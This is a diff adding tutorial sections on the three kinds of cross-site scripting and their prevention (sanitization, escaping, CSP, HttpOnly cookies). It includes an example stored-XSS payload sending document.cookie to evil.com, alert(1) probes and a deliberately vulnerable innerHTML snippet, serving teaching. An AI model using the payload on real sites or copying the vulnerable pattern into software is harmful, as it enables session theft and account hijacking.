@@ -583,3 +583,149 @@ The attacker can now use the stolen session ID to impersonate the user.
 
 This attack is known as session hijacking.
 
+
+================================================================================
+SECTION 13: TYPES OF XSS ATTACKS
+================================================================================
+
+There are three main types of XSS attacks.
+
+
+1. STORED XSS
+
+Stored XSS is the most dangerous type of XSS attack.
+
+In this attack, the malicious script is permanently stored in the database.
+
+Examples of locations where stored XSS can occur:
+
+comment systems
+forum posts
+user profiles
+product reviews
+
+Attack flow:
+
+Attacker submits malicious script
+↓
+Script stored in database
+↓
+User loads page containing stored script
+↓
+Browser executes script
+
+Example malicious script:
+
+<script>
+fetch("https://evil.com/?cookie=" + document.cookie)
+</script>
+
+Every user who loads the page becomes a victim.
+
+
+2. REFLECTED XSS
+
+In reflected XSS, the malicious script is included in the URL.
+
+Example website:
+
+https://shop.com/search?q=laptop
+
+Server response might display:
+
+Results for: laptop
+
+Now the attacker creates a malicious link:
+
+https://shop.com/search?q=<script>alert(1)</script>
+
+If the server directly renders the search parameter, the response becomes:
+
+Results for: <script>alert(1)</script>
+
+The browser executes the script.
+
+Reflected XSS requires the victim to click the malicious link.
+
+
+3. DOM-BASED XSS
+
+DOM-based XSS occurs entirely on the frontend.
+
+The server is not involved.
+
+Example vulnerable JavaScript code:
+
+document.getElementById("output").innerHTML = location.hash
+
+If the user visits:
+
+site.com/#<script>alert(1)</script>
+
+The browser executes the script.
+
+
+================================================================================
+SECTION 14: XSS PREVENTION METHODS
+================================================================================
+
+Several techniques are used in production systems to prevent XSS attacks.
+
+
+INPUT SANITIZATION
+
+User input should be sanitized before being stored or displayed.
+
+Example libraries:
+
+sanitize-html
+DOMPurify
+
+Example:
+
+const sanitizeHtml = require("sanitize-html")
+
+const clean = sanitizeHtml(userInput)
+
+
+ESCAPING HTML
+
+Special characters should be converted into safe representations.
+
+Example conversions:
+
+<  becomes  &lt;
+>  becomes  &gt;
+
+Example:
+
+<script>
+
+becomes
+
+&lt;script&gt;
+
+
+CONTENT SECURITY POLICY (CSP)
+
+CSP is a browser security feature that restricts which scripts can run.
+
+Example header:
+
+Content-Security-Policy: script-src 'self'
+
+This means only scripts from the same domain are allowed.
+
+
+HTTP-ONLY COOKIES
+
+Cookies can be configured so JavaScript cannot access them.
+
+Example:
+
+Set-Cookie: sessionId=abc123; HttpOnly
+
+If an XSS attack occurs, the script cannot access cookies using:
+
+document.cookie
+
